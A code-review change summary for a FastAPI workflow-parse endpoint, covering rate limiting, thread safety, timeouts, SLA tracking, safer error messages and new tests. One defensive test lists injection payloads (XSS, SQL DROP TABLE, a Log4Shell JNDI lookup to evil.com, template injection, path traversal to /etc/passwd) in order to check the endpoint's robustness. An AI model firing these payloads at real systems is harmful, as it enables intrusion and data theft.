================================================================================
CODE REVIEW FIXES - DETAILED CHANGES SUMMARY
Story 2.2 - Parse Endpoint Implementation
================================================================================

FILE 1: app/api/v1/workflow.py
================================================================================

IMPORTS ADDED:
--------------
+ import threading
+ import asyncio
+ import uuid
+ from fastapi import Request  (added to existing import)
+ from typing import Dict  (added to existing import)
+ from collections import defaultdict, deque

GLOBAL VARIABLES ADDED:
-----------------------
+ _parser_lock = threading.Lock()

+ # Rate limiter
+ _rate_limit_store: Dict[str, deque] = defaultdict(deque)
+ _rate_limit_lock = threading.Lock()
+ RATE_LIMIT_REQUESTS = 10
+ RATE_LIMIT_WINDOW = 60

NEW FUNCTION:
-------------
+ def check_rate_limit(client_ip: str) -> bool:
+     """Check if client has exceeded rate limit (10 req/min)"""
+     current_time = time.time()
+     with _rate_limit_lock:
+         timestamps = _rate_limit_store[client_ip]
+         while timestamps and current_time - timestamps[0] > RATE_LIMIT_WINDOW:
+             timestamps.popleft()
+         if len(timestamps) >= RATE_LIMIT_REQUESTS:
+             return False
+         timestamps.append(current_time)
+         return True

MODIFIED FUNCTION: get_parser()
--------------------------------
BEFORE:
    def get_parser() -> WorkflowParserAgent:
        global _parser_instance
        if _parser_instance is None:
            logger.info("Creating WorkflowParserAgent instance")
            _parser_instance = create_workflow_parser()
        return _parser_instance

AFTER:
    def get_parser() -> WorkflowParserAgent:
        global _parser_instance
        if _parser_instance is None:
            with _parser_lock:  # ADDED: Thread-safe lock
                if _parser_instance is None:  # ADDED: Double-check
                    logger.info("Creating WorkflowParserAgent instance")
                    _parser_instance = create_workflow_parser()
        return _parser_instance

MODIFIED MODEL: ParseRequest
-----------------------------
BEFORE:
    input: str = Field(
        ...,
        description="...",
        min_length=1,  # REMOVED
        max_length=500
    )

    @field_validator('input')  # CHANGED to mode='after'
    @classmethod
    def validate_input(cls, v: str) -> str:
        ...

AFTER:
    input: str = Field(
        ...,
        description="...",
        max_length=500
    )

    @field_validator('input', mode='after')  # ADDED mode='after'
    @classmethod
    def validate_input(cls, v: str) -> str:
        ...

MODIFIED MODEL: ParseSuccessResponse
-------------------------------------
ADDED FIELD:
    sla_exceeded: bool = Field(False, description="True if parse time exceeded 5000ms SLA")

UPDATED EXAMPLE:
    "parse_time_ms": 234.56,
+   "sla_exceeded": False,  # ADDED
    "timestamp": "2025-12-06T00:00:00.000000"

MODIFIED ENDPOINT: parse_workflow()
------------------------------------
SIGNATURE CHANGE:
    async def parse_workflow(request: ParseRequest) -> ParseSuccessResponse:
                                                    # REMOVED this
TO:
    async def parse_workflow(request: ParseRequest, http_request: Request) -> ParseSuccessResponse:
                                                    # ADDED http_request parameter

ADDED AT START:
+   # Rate limiting
+   client_ip = http_request.client.host if http_request.client else "unknown"
+   if not check_rate_limit(client_ip):
+       logger.warning(f"Rate limit exceeded for IP: {client_ip}")
+       raise HTTPException(status_code=429, detail={...})

WRAPPED PARSER CALL WITH TIMEOUT:
BEFORE:
    result: ParserResponse = await parser.parse_workflow(request.input)

AFTER:
+   try:
        result: ParserResponse = await asyncio.wait_for(
            parser.parse_workflow(request.input),
            timeout=5.0
        )
+   except asyncio.TimeoutError:
+       error_id = str(uuid.uuid4())[:8]
+       logger.error(f"Parse timeout [error_id={error_id}]")
+       raise HTTPException(status_code=503, detail={...})

ADDED SLA TRACKING:
+   sla_exceeded = parse_time_ms > 5000
+   if sla_exceeded:
+       logger.warning(f"Parse time {parse_time_ms}ms exceeded 5s SLA")

UPDATED RESPONSE:
    return ParseSuccessResponse(
        success=True,
        workflow_spec=result.workflow,
        confidence=result.confidence,
        parse_time_ms=round(parse_time_ms, 2),
+       sla_exceeded=sla_exceeded  # ADDED
    )

MODIFIED EXCEPTION HANDLER:
BEFORE:
    except Exception as e:
        logger.error(f"Unexpected error: {e}", exc_info=True)
        raise HTTPException(
            status_code=500,
            detail={
                ...,
                "details": str(e),  # SECURITY ISSUE: Exposes internal error
                ...
            }
        )

AFTER:
    except Exception as e:
+       error_id = str(uuid.uuid4())[:8]  # ADDED: Generate tracking ID
+       logger.error(f"Unexpected error [error_id={error_id}]: {e}", exc_info=True)
        raise HTTPException(
            status_code=500,
            detail={
                ...,
+               "details": f"Please contact support with error ID: {error_id}",  # FIXED
                ...
            }
        )

================================================================================
FILE 2: tests/test_parse_endpoint.py
================================================================================

MODIFIED TEST: test_parse_endpoint_success()
---------------------------------------------
ADDED ASSERTION:
    assert "parse_time_ms" in data
+   assert "sla_exceeded" in data  # ADDED
    assert "timestamp" in data

MODIFIED TEST: test_parse_endpoint_response_structure()
--------------------------------------------------------
ADDED ASSERTIONS:
    assert "parse_time_ms" in data
+   assert "sla_exceeded" in data  # ADDED
    assert "timestamp" in data

    # Check types
    ...
    assert isinstance(data["parse_time_ms"], (int, float))
+   assert isinstance(data["sla_exceeded"], bool)  # ADDED
    assert isinstance(data["timestamp"], str)

MODIFIED TEST: test_parse_endpoint_cors_headers()
--------------------------------------------------
BEFORE (WEAK TEST):
    assert "access-control-allow-origin" in response.headers or response.status_code == 200

AFTER (PROPER TEST):
+   assert response.status_code == 200
    assert "access-control-allow-origin" in response.headers
+   assert response.headers["access-control-allow-origin"] in [
+       "http://localhost:5173",
+       "*"
+   ]

NEW TEST: test_parse_endpoint_rate_limiting()
----------------------------------------------
ADDED COMPLETE NEW TEST:
+   def test_parse_endpoint_rate_limiting():
+       """Test that rate limiting is enforced (10 requests per minute)"""
+       # Clear rate limit store
+       from app.api.v1.workflow import _rate_limit_store
+       _rate_limit_store.clear()
+
+       # Make 10 requests - should all succeed
+       for i in range(10):
+           response = client.post("/api/v1/parse", json={...})
+           assert response.status_code == 200
+
+       # 11th request should be rate limited
+       response = client.post("/api/v1/parse", json={...})
+       assert response.status_code == 429
+       assert detail["error"]["code"] == "RATE_LIMIT_EXCEEDED"

NEW TEST: test_parse_endpoint_exactly_501_chars()
--------------------------------------------------
ADDED COMPLETE NEW TEST:
+   def test_parse_endpoint_exactly_501_chars():
+       """Test validation error for exactly 501 characters"""
+       input_501 = "x" * 501
+       response = client.post("/api/v1/parse", json={"input": input_501})
+       assert response.status_code == 422

NEW TEST: test_parse_endpoint_unicode_input()
----------------------------------------------
ADDED COMPLETE NEW TEST:
+   def test_parse_endpoint_unicode_input():
+       """Test that unicode characters are handled correctly"""
+       response = client.post(
+           "/api/v1/parse",
+           json={"input": "When GAS drops below $5 ðŸš€, swap 10 GAS for NEO ðŸ’°"}
+       )
+       assert response.status_code == 200
+       assert data["success"] is True

NEW TEST: test_parse_endpoint_injection_safety()
-------------------------------------------------
ADDED COMPLETE NEW TEST:
+   def test_parse_endpoint_injection_safety():
+       """Test that potential injection attempts are safely handled"""
+       injection_payloads = [
+           "<script>alert('xss')</script>",
+           "'; DROP TABLE workflows; --",
+           "${jndi:ldap://evil.com/a}",
+           "{{7*7}}",
+           "../../../etc/passwd",
+       ]
+       for payload in injection_payloads:
+           response = client.post("/api/v1/parse", json={"input": payload})
+           assert response.status_code in [200, 400, 422]  # Should not crash

================================================================================
SUMMARY OF CHANGES
================================================================================

Files Modified: 2
Lines Added: ~150
Lines Removed: ~5
Lines Modified: ~20

New Functions: 1 (check_rate_limit)
Modified Functions: 2 (get_parser, parse_workflow)
New Model Fields: 1 (sla_exceeded)
New Tests: 4
Modified Tests: 3

Security Fixes: 2 (thread safety, error leakage)
Performance Fixes: 3 (rate limiting, timeout, SLA tracking)
Test Coverage Improvements: 7 tests added/modified

================================================================================
END OF CHANGES SUMMARY
================================================================================
